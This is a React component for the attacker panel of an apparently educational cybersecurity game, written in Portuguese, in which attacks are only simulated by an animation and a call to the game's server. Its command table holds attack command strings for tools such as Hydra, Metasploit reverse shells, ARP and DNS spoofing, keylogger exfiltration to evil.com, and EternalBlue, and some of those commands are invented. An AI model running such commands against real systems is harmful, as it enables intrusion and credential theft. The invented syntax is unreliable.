import { useState, useMemo, useEffect, useRef } from "react";
import { useMutation } from "@tanstack/react-query";
import { queryClient, apiRequest } from "@/lib/queryClient";
import type { GameState } from "@shared/schema";
import { attackTypes } from "@shared/schema";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Stepper } from "@/components/ui/stepper";
import { TerminalOutput } from "@/components/terminal-output";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Terminal, Target, Play, Zap, Keyboard, Mouse,  BookOpen } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { cn } from "@/lib/utils";
import { Badge } from "@/components/ui/badge";
import { HackerHelpGuide } from "@/components/hacker-help-guide";
import { AttackGuide } from "@/components/attack-guide";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

interface HackerPanelProps {
  gameState: GameState;
}

export function HackerPanelImproved({ gameState }: HackerPanelProps) {
  const { toast } = useToast();
  const [selectedAttack, setSelectedAttack] = useState<string | null>(null);
  const [attackStep, setAttackStep] = useState(0);
  const [selectedTool, setSelectedTool] = useState('');
  const [command, setCommand] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);
  const [attackProgress, setAttackProgress] = useState(0);
  const [attackMode, setAttackMode] = useState<'facilitated' | 'manual'>('facilitated');
  const progressIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const attackTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    return () => {
      if (progressIntervalRef.current) {
        clearInterval(progressIntervalRef.current);
      }
      if (attackTimeoutRef.current) {
        clearTimeout(attackTimeoutRef.current);
      }
    };
  }, []);

  const executeAttackMutation = useMutation({
    mutationFn: (attackId: string) =>
      apiRequest('POST', '/api/attack/execute', { attackId }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/game-state'] });
      setSelectedAttack(null);
      setAttackStep(0);
      setSelectedTool('');
      setCommand('');
      setIsExecuting(false);
    },
  });

  const handleStartAttack = (attackId: string) => {
    setSelectedAttack(attackId);
    setAttackStep(1);
  };

  const handleSelectTool = (tool: string) => {
    setSelectedTool(tool);
    const defaultCommand = getAttackCommands(selectedAttack!, tool);
    setCommand(defaultCommand);
    setAttackStep(2);
  };

  const handleExecuteCommand = () => {
    if (!selectedAttack) return;
    
    setIsExecuting(true);
    setAttackStep(3);
    setAttackProgress(0);
    
    // Limpar intervalos anteriores
    if (progressIntervalRef.current) {
      clearInterval(progressIntervalRef.current);
    }
    if (attackTimeoutRef.current) {
      clearTimeout(attackTimeoutRef.current);
    }
    
    // Simular progresso do ataque com animação suave
    progressIntervalRef.current = setInterval(() => {
      setAttackProgress(prev => {
        if (prev >= 100) {
          if (progressIntervalRef.current) {
            clearInterval(progressIntervalRef.current);
          }
          return 100;
        }
        return prev + 1;
      });
    }, 30);
    
    // Executar ataque após animação
    attackTimeoutRef.current = setTimeout(() => {
      executeAttackMutation.mutate(selectedAttack);
      setIsExecuting(false);
      setAttackProgress(0);
    }, 3000);
  };

  const getAttackTools = (attackId: string) => {
    const tools: Record<string, string[]> = {
      social_engineering: ['Social Mapper', 'SET Toolkit', 'Maltego'],
      phishing: ['Gophish', 'King Phisher', 'Social Engineer Toolkit'],
      brute_force: ['Hydra', 'John the Ripper', 'Hashcat'],
      keylogger: ['KeyLogger Pro', 'Spyrix', 'Actual Keylogger'],
      password_leak: ['Shodan', 'Have I Been Pwned API', 'DeHashed'],
      session_hijacking: ['Wireshark', 'Burp Suite', 'OWASP ZAP'],
      man_in_the_middle: ['Ettercap', 'MITMProxy', 'BetterCAP'],
      credential_stuffing: ['Sentry MBA', 'SNIPR', 'OpenBullet'],
      sim_swap: ['SS7 Hack Tools', 'SIMjacker', 'Femtocell Kit'],
      malware_injection: ['Metasploit', 'Cobalt Strike', 'Empire'],
      dns_spoofing: ['DNSChef', 'Ettercap DNS', 'DNSMasq'],
      zero_day_exploit: ['Custom Exploit', 'Exploit-DB', 'NSA Toolkit'],
    };
    return tools[attackId] || [];
  };

  const getAttackCommands = (attackId: string, tool: string) => {
    const commands: Record<string, Record<string, string>> = {
      social_engineering: {
        'Social Mapper': 'python social_mapper.py -f linkedin -i targets.txt --output results/',
        'SET Toolkit': 'setoolkit --phishing --credential-harvester --port 80',
        'Maltego': 'maltego --investigate --target user@email.com --depth 3',
      },
      phishing: {
        'Gophish': 'gophish launch --template fake_login --targets list.csv --smtp-server relay.local',
        'King Phisher': 'king-phisher-server --config phishing.yml --host 0.0.0.0',
        'Social Engineer Toolkit': 'set --phishing-attack --clone-website https://target.com',
      },
      brute_force: {
        'Hydra': 'hydra -l admin -P passwords.txt -t 16 ssh://target.com',
        'John the Ripper': 'john --wordlist=rockyou.txt --format=sha512 hashes.txt',
        'Hashcat': 'hashcat -m 0 -a 0 -w 3 hash.txt wordlist.txt',
      },
      keylogger: {
        'KeyLogger Pro': 'keylogger.exe --stealth --output logs.txt --interval 1000',
        'Spyrix': 'spyrix-start --hidden --email send@me.com --screenshots yes',
        'Actual Keylogger': 'akl.exe /silent /email:hacker@evil.com /screenshot:60',
      },
      password_leak: {
        'Shodan': 'shodan search "MongoDB" --limit 100 --fields ip_str,port',
        'Have I Been Pwned API': 'curl -H "hibp-api-key: KEY" https://api.pwnedpasswords.com/range/HASH',
        'DeHashed': 'dehashed --email target@email.com --output json',
      },
      session_hijacking: {
        'Wireshark': 'wireshark -i eth0 -f "tcp port 443" -w capture.pcap -Y "http.cookie"',
        'Burp Suite': 'burpsuite --proxy-intercept --target https://site.com --save-session',
        'OWASP ZAP': 'zap-cli quick-scan --spider --ajax-spider https://target.com',
      },
      man_in_the_middle: {
        'Ettercap': 'ettercap -T -M arp:remote /192.168.1.100/ /192.168.1.1/ -w dump.pcap',
        'MITMProxy': 'mitmproxy --mode transparent --showhost --ssl-insecure',
        'BetterCAP': 'bettercap -iface eth0 -caplet http-req-dump --silent',
      },
      credential_stuffing: {
        'Sentry MBA': 'sentry-mba --config bank.ini --proxy list.txt --threads 200',
        'SNIPR': 'snipr --combolist leaked.txt --threads 100 --timeout 5',
        'OpenBullet': 'openbullet --config bank.loli --wordlist combos.txt --bots 50',
      },
      sim_swap: {
        'SS7 Hack Tools': 'ss7-tool --intercept-sms --target +5511999999999 --redirect +551188888888',
        'SIMjacker': 'simjacker-exploit --send-payload --number +55119 --command LOCATION',
        'Femtocell Kit': 'femto-cell --clone-sim --imsi 724031234567890 --ki SECRET_KEY',
      },
      malware_injection: {
        'Metasploit': 'msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.0.1; exploit"',
        'Cobalt Strike': 'cobaltstrike --listener https --payload beacon.exe --sleep 60',
        'Empire': 'empire --stager windows --listener http --obfuscate --execute',
      },
      dns_spoofing: {
        'DNSChef': 'dnschef --fakeip 192.168.1.100 --interface eth0 --fakedomains target.com',
        'Ettercap DNS': 'ettercap -T -q -M arp -P dns_spoof /192.168.1.100// /192.168.1.1//',
        'DNSMasq': 'dnsmasq --address=/bank.com/10.0.0.1 --address=/secure.bank.com/10.0.0.1 --no-daemon',
      },
      zero_day_exploit: {
        'Custom Exploit': 'python3 zero-day-exploit.py --target 192.168.1.1 --payload reverse-shell --obfuscate',
        'Exploit-DB': 'searchsploit "browser RCE 2024" | grep -i Chrome | head -1 | xargs exploit-db --execute',
        'NSA Toolkit': './eternal-blue.exe --target windows-server-2019 --port 445 --payload doublepulsar',
      },
    };
    return commands[attackId]?.[tool] || '';
  };

  const terminalLines = useMemo(() => {
    if (!selectedAttack) return [];
    const attackId = selectedAttack;
    const attack = attackTypes.find(a => a.id === attackId);
    if (!attack) return [];

    type TerminalLine = { text: string; type?: 'input' | 'output' | 'error' | 'success' | 'warning'; delay?: number };
    const progressLines: TerminalLine[] = [];
    
    if (attackProgress > 5) {
      progressLines.push({ text: '[*] Initializing attack framework...', type: 'output' as const, delay: 100 });
      progressLines.push({ text: '[+] Framework loaded successfully', type: 'success' as const, delay: 100 });
    }
    if (attackProgress > 15) {
      progressLines.push({ text: '[*] Scanning target systems...', type: 'output' as const, delay: 100 });
      progressLines.push({ text: `[*] Ports open: 22, 80, 443, 3306`, type: 'output' as const, delay: 100 });
    }
    if (attackProgress > 25) {
      progressLines.push({ text: '[+] Target acquired: ' + (gameState.casualUser.email || 'unknown@target.com'), type: 'success' as const, delay: 100 });
      progressLines.push({ text: `[*] Target name: ${gameState.casualUser.name || 'Unknown'}`, type: 'output' as const, delay: 100 });
    }
    if (attackProgress > 40) {
      progressLines.push({ text: '[*] Analyzing security measures...', type: 'output' as const, delay: 100 });
      const activeMeasures = Object.entries(gameState.casualUser.securityMeasures)
        .filter(([_, enabled]) => enabled)
        .map(([key]) => key);
      if (activeMeasures.length > 0) {
        progressLines.push({ text: `[!] Detected defenses (${activeMeasures.length}): ${activeMeasures.slice(0, 3).join(', ')}${activeMeasures.length > 3 ? '...' : ''}`, type: 'warning' as const, delay: 100 });
        progressLines.push({ text: `[*] Vulnerability score: ${gameState.vulnerabilityScore}%`, type: 'output' as const, delay: 100 });
      } else {
        progressLines.push({ text: '[+] No active defenses detected!', type: 'success' as const, delay: 100 });
      }
    }
    if (attackProgress > 55) {
      progressLines.push({ text: '[*] Preparing exploit payload...', type: 'output' as const, delay: 100 });
      progressLines.push({ text: '[+] Payload encrypted and ready', type: 'success' as const, delay: 100 });
    }
    if (attackProgress > 70) {
      progressLines.push({ text: '[*] Executing exploit...', type: 'output' as const, delay: 100 });
      progressLines.push({ text: '[*] Establishing connection...', type: 'output' as const, delay: 100 });
    }
    if (attackProgress > 85) {
      progressLines.push({ text: '[*] Bypassing security layers...', type: 'output' as const, delay: 100 });
      progressLines.push({ text: '[*] Attempting privilege escalation...', type: 'output' as const, delay: 100 });
    }
    if (attackProgress >= 100) {
      progressLines.push({ text: '[*] Attack complete. Processing results...', type: 'output' as const, delay: 100 });
    }

    const baseLines: TerminalLine[] = [
      { text: `╔════════════════════════════════════════════╗`, type: 'output' as const, delay: 50 },
      { text: `║  ${attack.name.toUpperCase().padEnd(42)}║`, type: 'output' as const, delay: 50 },
      { text: `╚════════════════════════════════════════════╝`, type: 'output' as const, delay: 50 },
      { text: '', type: 'output' as const, delay: 50 },
      { text: `$ ${command}`, type: 'input' as const, delay: 200 },
      { text: '', type: 'output' as const, delay: 50 },
      ...progressLines,
    ];

    return baseLines;
  }, [selectedAttack, attackProgress, command, gameState.casualUser.email, gameState.casualUser.name, gameState.casualUser.securityMeasures, gameState.vulnerabilityScore]);

  const currentAttack = attackTypes.find(a => a.id === selectedAttack);

  return (
    <div className="flex h-full flex-col overflow-hidden bg-slate-950">
      <div className="border-b border-slate-800 bg-slate-900 px-4 py-3 lg:px-6 lg:py-4">
        <div className="flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-gradient-to-br from-red-600 to-orange-600">
            <Terminal className="h-6 w-6 text-white" />
          </div>
          <div className="flex-1 min-w-0">
            <h2 className="font-semibold text-white truncate">Console do Hacker</h2>
            <p className="text-xs text-slate-400 truncate">Centro de Controle de Ataques</p>
          </div>
        </div>
      </div>

      <Tabs defaultValue="attacks" className="flex-1 flex flex-col overflow-hidden">
        <div className="border-b border-slate-800 bg-slate-900 px-4 lg:px-6">
          <TabsList className="w-full justify-start bg-transparent border-0 p-0 h-auto">
            <TabsTrigger 
              value="attacks" 
              className="rounded-none border-b-2 border-transparent data-[state=active]:border-red-500 data-[state=active]:bg-transparent px-4 py-3"
            >
              <Target className="h-4 w-4 mr-2 text-white" />
              <span className="hidden sm:inline text-white">Ataques</span>
            </TabsTrigger>
            <TabsTrigger 
              value="guide"
              className="rounded-none border-b-2 border-transparent data-[state=active]:border-red-500 data-[state=active]:bg-transparent px-4 py-3"
            >
              <BookOpen className="h-4 w-4 mr-2 text-white" />
              <span className="hidden sm:inline text-white">Guia de Ataques</span>
            </TabsTrigger>
          </TabsList>
        </div>

        <TabsContent value="attacks" className="flex-1 overflow-auto mt-0 focus-visible:outline-none focus-visible:ring-0">
        <div className="flex-1 space-y-6 p-4 lg:p-6">
          {/* Attack Mode Selection */}
          <div>
            <h3 className="mb-3 text-xs font-bold uppercase tracking-wider text-slate-500">Modo de Ataque</h3>
            <div className="grid gap-3 sm:grid-cols-2">
              <button
                onClick={() => setAttackMode('facilitated')}
                className={cn(
                  "rounded-lg border p-4 text-left transition-all",
                  attackMode === 'facilitated'
                    ? "border-red-600 bg-red-600/10"
                    : "border-slate-800 bg-slate-900 hover:bg-slate-800"
                )}
              >
                <div className="flex items-center gap-3">
                  <div className={cn(
                    "rounded-lg p-2",
                    attackMode === 'facilitated' ? "bg-red-600/20" : "bg-slate-800"
                  )}>
                    <Mouse className="h-5 w-5 text-red-500" />
                  </div>
                  <div className="flex-1">
                    <h4 className="font-semibold text-white flex items-center gap-2">
                      Modo Facilitado
                      {attackMode === 'facilitated' && <Badge className="bg-red-600">Ativo</Badge>}
                    </h4>
                    <p className="mt-1 text-xs text-slate-400">
                      Comandos pré-configurados prontos para usar
                    </p>
                  </div>
                </div>
              </button>

              <button
                onClick={() => setAttackMode('manual')}
                className={cn(
                  "rounded-lg border p-4 text-left transition-all",
                  attackMode === 'manual'
                    ? "border-red-600 bg-red-600/10"
                    : "border-slate-800 bg-slate-900 hover:bg-slate-800"
                )}
              >
                <div className="flex items-center gap-3">
                  <div className={cn(
                    "rounded-lg p-2",
                    attackMode === 'manual' ? "bg-red-600/20" : "bg-slate-800"
                  )}>
                    <Keyboard className="h-5 w-5 text-red-500" />
                  </div>
                  <div className="flex-1">
                    <h4 className="font-semibold text-white flex items-center gap-2">
                      Modo Manual
                      {attackMode === 'manual' && <Badge className="bg-red-600">Ativo</Badge>}
                    </h4>
                    <p className="mt-1 text-xs text-slate-400">
                      Escreva os comandos manualmente
                    </p>
                  </div>
                </div>
              </button>
            </div>
          </div>

          {/* Attack Selection */}
          {!gameState.casualUser.accountCreated ? (
            <div className="flex h-64 items-center justify-center rounded-lg border border-dashed border-slate-700">
              <div className="text-center">
                <Target className="mx-auto mb-2 h-8 w-8 text-slate-600" />
                <p className="text-sm text-slate-400">
                  Aguardando alvo criar conta...
                </p>
              </div>
            </div>
          ) : (
            <>
              <div>
                <h3 className="mb-3 text-xs font-bold uppercase tracking-wider text-slate-500">Arsenal de Ataques</h3>
                <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
                  {attackTypes.map((attack) => {
                    const cooldown = gameState.hacker.cooldowns[attack.id];
                    const isOnCooldown = !!(cooldown && cooldown > Date.now());
                    const remainingTime = isOnCooldown ? Math.ceil((cooldown - Date.now()) / 1000) : 0;

                    return (
                      <button
                        key={attack.id}
                        onClick={() => !isOnCooldown && handleStartAttack(attack.id)}
                        disabled={isOnCooldown}
                        className={cn(
                          "relative overflow-hidden rounded-lg border p-3.5 text-left transition-all",
                          isOnCooldown
                            ? "cursor-not-allowed border-slate-800 bg-slate-900/50 opacity-50"
                            : "border-slate-800 bg-slate-900 hover:border-red-600 hover:bg-slate-800/80"
                        )}
                      >
                        {isOnCooldown && remainingTime > 0 && (
                          <div
                            className="absolute bottom-0 left-0 h-1 bg-red-600 transition-all"
                            style={{
                              width: `${(remainingTime / (attack.cooldown / 1000)) * 100}%`,
                            }}
                          />
                        )}
                        <div className="flex items-start gap-2.5">
                          <div className="rounded-md bg-red-600/20 p-1.5">
                            <Zap className="h-4 w-4 text-red-500" />
                          </div>
                          <div className="flex-1">
                            <h4 className="text-sm font-semibold text-white">{attack.name}</h4>
                            <p className="mt-1 text-xs leading-relaxed text-slate-400">
                              {attack.description}
                            </p>
                            {isOnCooldown && (
                              <p className="mt-2 text-xs font-medium text-red-400">
                                Recarga: {remainingTime}s
                              </p>
                            )}
                          </div>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>

              <div>
                <h3 className="mb-3 text-xs font-bold uppercase tracking-wider text-slate-500">Estatísticas de Ataque</h3>
                <div className="grid gap-4 sm:grid-cols-3">
                  <div className="rounded-lg border border-slate-800 bg-slate-900 p-4">
                    <div className="text-2xl font-bold text-white">
                      {gameState.hacker.attacksAttempted}
                    </div>
                    <div className="text-xs text-slate-400">Tentativas</div>
                  </div>
                  <div className="rounded-lg border border-slate-800 bg-slate-900 p-4">
                    <div className="text-2xl font-bold text-red-500">
                      {gameState.hacker.attacksSuccessful}
                    </div>
                    <div className="text-xs text-slate-400">Sucessos</div>
                  </div>
                  <div className="rounded-lg border border-slate-800 bg-slate-900 p-4">
                    <div className="text-2xl font-bold text-green-500">
                      {gameState.vulnerabilityScore}%
                    </div>
                    <div className="text-xs text-slate-400">Vulnerabilidade Alvo</div>
                  </div>
                </div>
              </div>
            </>
          )}
          </div>
        </TabsContent>

        <TabsContent value="guide" className="flex-1 overflow-auto mt-0 focus-visible:outline-none focus-visible:ring-0">
          <AttackGuide />
        </TabsContent>
      </Tabs>

      {/* Attack Execution Dialog */}
      <Dialog open={selectedAttack !== null} onOpenChange={() => setSelectedAttack(null)}>
        <DialogContent className="max-w-3xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Terminal className="h-5 w-5 text-hacker-danger" />
              {currentAttack?.name}
            </DialogTitle>
            <DialogDescription>
              {currentAttack?.description}
            </DialogDescription>
          </DialogHeader>

          <Stepper
            steps={[
              { title: 'Reconhecimento' },
              { title: 'Execução' },
              { title: 'Resultado' },
            ]}
            currentStep={attackStep - 1}
          />

          {/* Step 1: Recon - Choose Tool */}
          {attackStep === 1 && (
            <div className="space-y-4">
              <p className="text-sm text-muted-foreground">Escolha uma ferramenta para o ataque:</p>
              <div className="grid gap-2 sm:grid-cols-2">
                {getAttackTools(selectedAttack!).map((tool) => (
                  <Button
                    key={tool}
                    variant="outline"
                    className="justify-start font-mono text-sm h-auto py-3"
                    onClick={() => handleSelectTool(tool)}
                  >
                    <Terminal className="mr-2 h-4 w-4 flex-shrink-0" />
                    <span className="text-left">{tool}</span>
                  </Button>
                ))}
              </div>
            </div>
          )}

          {/* Step 2: Execution - Write/Select Command */}
          {attackStep === 2 && selectedTool && (
            <div className="space-y-4">
              <div>
                <p className="mb-2 text-sm text-muted-foreground">Ferramenta selecionada:</p>
                <div className="rounded-lg border bg-muted/30 p-3 font-mono text-sm">
                  {selectedTool}
                </div>
              </div>

              {attackMode === 'manual' ? (
                <div>
                  <p className="mb-2 text-sm text-muted-foreground">Digite o comando manualmente:</p>
                  <Input
                    placeholder="Digite o comando..."
                    value={command}
                    onChange={(e) => setCommand(e.target.value)}
                    className="font-mono text-sm"
                    onKeyDown={(e) => {
                      if (e.key === 'Enter' && command) {
                        handleExecuteCommand();
                      }
                    }}
                  />
                  <p className="mt-2 text-xs text-muted-foreground">
                    Sugestão: {getAttackCommands(selectedAttack!, selectedTool)}
                  </p>
                </div>
              ) : (
                <div>
                  <p className="mb-2 text-sm text-muted-foreground">Comando pré-configurado:</p>
                  <div className="rounded-lg border bg-black/50 p-4 font-mono text-sm text-green-400">
                    <div className="flex gap-2">
                      <span className="text-gray-500">$</span>
                      <span>{command}</span>
                    </div>
                  </div>
                  <p className="mt-2 text-xs text-muted-foreground">
                    No modo facilitado, o comando está pronto. Clique em "Executar" para iniciar.
                  </p>
                </div>
              )}

              <div className="flex gap-2">
                <Button variant="outline" onClick={() => setAttackStep(1)} className="flex-1">
                  Voltar
                </Button>
                <Button
                  onClick={handleExecuteCommand}
                  disabled={!command}
                  className="flex-1 bg-hacker-danger hover:bg-hacker-danger/90"
                >
                  <Play className="mr-2 h-4 w-4" />
                  Executar Ataque
                </Button>
              </div>
            </div>
          )}

          {/* Step 3: Outcome - Terminal Output */}
          {attackStep === 3 && (
            <div className="space-y-4">
              <TerminalOutput
                lines={terminalLines}
                isRunning={isExecuting}
                showProgress={isExecuting}
                progress={attackProgress}
              />
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
